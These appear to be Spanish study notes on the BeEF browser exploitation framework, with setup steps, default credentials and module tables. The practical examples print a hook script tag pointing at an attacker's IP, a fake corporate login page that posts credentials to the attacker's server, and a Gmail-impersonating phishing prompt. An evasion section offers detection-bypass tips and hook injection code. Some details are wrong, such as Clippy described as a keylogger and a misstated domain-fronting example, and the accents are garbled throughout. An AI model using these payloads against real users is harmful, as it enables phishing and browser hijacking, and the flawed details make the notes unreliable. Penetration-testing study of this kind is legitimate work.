---
Tema: "[[apuntes/herramientas/herramientas|herramientas]]"
---

# üêÇ BeEF - Browser Exploitation Framework
---

## üéØ Introducci√≥n

>[!info] ¬øQu√© es BeEF?
>**BeEF (Browser Exploitation Framework)** es una herramienta de penetration testing enfocada en explotar vulnerabilidades web a trav√©s del navegador del cliente. Permite controlar navegadores web comprometidos y realizar diversas t√©cnicas de explotaci√≥n desde el lado del cliente.

### ¬øPara qu√© sirve?
- **Post-explotaci√≥n web**: Una vez que se compromete un navegador
- **Social Engineering**: Crear ataques dirigidos a usuarios
- **Demonstraci√≥n de vulnerabilidades**: Mostrar el impacto real de XSS
- **Red Team Operations**: Simular ataques APT reales

### Contextos de uso
- Auditor√≠as de seguridad web
- Pruebas de penetraci√≥n
- Educaci√≥n en ciberseguridad
- Evaluaci√≥n de la conciencia de seguridad del usuario

---

## ‚öôÔ∏è Instalaci√≥n y Configuraci√≥n

### Instalaci√≥n en Kali Linux
```bash
# BeEF viene preinstalado en Kali Linux
sudo apt update
sudo apt install beef-xss

# Instalar dependencias adicionales
sudo gem install bundler
```

### Configuraci√≥n inicial
```bash
# Navegar al directorio de BeEF
cd /usr/share/beef-xss

# Configurar credenciales (archivo config.yaml)
sudo nano config.yaml
```

>[!tip] Configuraci√≥n b√°sica
>- Usuario por defecto: `beef`
>- Contrase√±a por defecto: `beef`
>- Puerto web: `3000`
>- Puerto hook: `3000/hook.js`

---

## üöÄ Gu√≠a Pr√°ctica de Uso

### Sintaxis b√°sica
```bash
# Iniciar BeEF
sudo beef-xss

# Iniciar con configuraci√≥n espec√≠fica
sudo beef-xss -c /path/to/config.yaml
```

### Par√°metros y opciones comunes

| Par√°metro | Descripci√≥n | Ejemplo |
|-----------|-------------|---------|
| `-c` | Archivo de configuraci√≥n personalizado | `beef-xss -c custom.yaml` |
| `-x` | Deshabilitar extensiones | `beef-xss -x` |
| `-v` | Modo verbose | `beef-xss -v` |
| `-d` | Modo debug | `beef-xss -d` |

### Flujo de trabajo t√≠pico

```mermaid
flowchart TD
    A[Iniciar BeEF] --> B[Acceder Panel Web]
    B --> C[Obtener Hook JS]
    C --> D[Inyectar Hook en objetivo]
    D --> E[V√≠ctima ejecuta JS]
    E --> F[Navegador comprometido]
    F --> G[Ejecutar m√≥dulos]
    G --> H[Post-explotaci√≥n]
```

---

## üíª Ejemplos Pr√°cticos

### Ejemplo 1: Configuraci√≥n b√°sica y primer hook

>[!example] Escenario b√°sico
>Comprometer un navegador mediante XSS stored en una aplicaci√≥n web vulnerable

```bash
# 1. Iniciar BeEF
sudo beef-xss

# 2. Acceder al panel de administraci√≥n
# http://localhost:3000/ui/panel
# Usuario: beef / Contrase√±a: beef
```

**Payload para inyectar:**
```html
<script src="http://[TU_IP]:3000/hook.js"></script>
```

### Ejemplo 2: Ataque de phishing interno

>[!example] Crear una p√°gina de phishing
>Redirigir a los usuarios a una p√°gina falsa para capturar credenciales

```javascript
// M√≥dulo: Create Invisible Iframe
// URL objetivo: http://interno.empresa.com/login

// Configuraci√≥n del m√≥dulo
{
  "url": "http://[TU_IP]/phishing.html",
  "width": "100%",
  "height": "100%"
}
```

**P√°gina de phishing (phishing.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Login Corporativo</title>
</head>
<body>
    <form action="http://[TU_IP]:3000/capture" method="POST">
        <input type="text" name="username" placeholder="Usuario">
        <input type="password" name="password" placeholder="Contrase√±a">
        <button type="submit">Iniciar Sesi√≥n</button>
    </form>
</body>
</html>
```

### Ejemplo 3: Keylogger y captura de informaci√≥n

>[!example] Capturar pulsaciones de teclado
>Instalar un keylogger en el navegador comprometido

```bash
# En el panel de BeEF:
# 1. Seleccionar navegador comprometido
# 2. Ir a Commands > Input
# 3. Ejecutar "Pretty Theft"

# Configuraci√≥n Pretty Theft:
{
  "sitename": "Gmail",
  "message": "Su sesi√≥n ha expirado. Ingrese sus credenciales:"
}
```

---

## üõ†Ô∏è M√≥dulos Principales

### M√≥dulos de Informaci√≥n
| M√≥dulo | Funci√≥n | Uso |
|--------|---------|-----|
| **Get Cookie** | Captura cookies | Obtener tokens de sesi√≥n |
| **Get Page HTML** | Obtiene HTML completo | An√°lisis de contenido |
| **Detect Software** | Detecta software instalado | Reconocimiento |

### M√≥dulos de Explotaci√≥n
| M√≥dulo | Funci√≥n | Uso |
|--------|---------|-----|
| **Pretty Theft** | Phishing convincente | Captura credenciales |
| **Clippy** | Keylogger avanzado | Captura pulsaciones |
| **Internal Network Fingerprinting** | Escaneo de red interna | Reconocimiento de LAN |

### M√≥dulos de Persistencia
| M√≥dulo | Funci√≥n | Uso |
|--------|---------|-----|
| **Create Invisible Iframe** | Marco invisible | Mantener conexi√≥n |
| **Man-in-the-Browser** | Interceptar tr√°fico | Manipular requests |

---

## üéØ Tips y Buenas Pr√°cticas

>[!tip] Optimizaci√≥n de uso
>- **Usa HTTPS**: Configura certificados SSL para evitar detecci√≥n
>- **Cambia puertos**: No uses los puertos por defecto
>- **Personaliza hooks**: Modifica el c√≥digo JS para ser menos detectable
>- **Rotaci√≥n de IP**: Usa m√∫ltiples direcciones IP si es posible

>[!warning] Errores comunes
>- **No configurar firewall**: Aseg√∫rate de que los puertos est√©n abiertos
>- **Hooks visibles**: El hook puede ser detectado en el c√≥digo fuente
>- **Falta de persistencia**: Los hooks se pierden al recargar la p√°gina
>- **Detecci√≥n por antivirus**: Algunos AV detectan los m√≥dulos de BeEF

### Configuraci√≥n avanzada

```yaml
# config.yaml - Configuraci√≥n personalizada
beef:
    version: '0.5.3.0'
    debug: false
    crypto_default_value_length: 80
    
http:
    debug: false
    host: "0.0.0.0"
    port: "3000"
    
https:
    enable: true
    host: "0.0.0.0"
    port: "3443"
```

### Bypass de detecci√≥n

>[!tip] T√©cnicas de evasi√≥n
>```javascript
>// Hook ofuscado
>var s=document.createElement('script');
>s.type='text/javascript';
>s.src='http://[IP]:3000/hook.js';
>document.head.appendChild(s);
>
>// Hook con dominio leg√≠timo (domain fronting)
>var s=document.createElement('script');
>s.src='https://cdn.jquery.com/beef.js';
>document.head.appendChild(s);
>```

---

## üîí Consideraciones de Seguridad

>[!warning] Uso √©tico
>- **Solo en entornos autorizados**: Nunca usar sin permiso expl√≠cito
>- **Documentar todo**: Mantener registros de las pruebas realizadas  
>- **Limpiar despu√©s**: Remover hooks y payloads tras las pruebas
>- **Informar vulnerabilidades**: Reportar hallazgos de manera responsable

### Detecci√≥n y mitigaci√≥n

>[!info] C√≥mo detectar BeEF
>- Monitorear conexiones a puertos 3000/3443
>- Buscar archivos `hook.js` en el tr√°fico
>- Analizar requests POST sospechosos
>- Implementar CSP (Content Security Policy)

---

## üìö Recursos Adicionales

- **Documentaci√≥n oficial**: Framework BeEF GitHub
- **M√≥dulos personalizados**: Desarrollo de extensiones
- **Integraci√≥n con Metasploit**: Combinar con otras herramientas
- **OWASP WebGoat**: Entorno de pr√°ctica seguro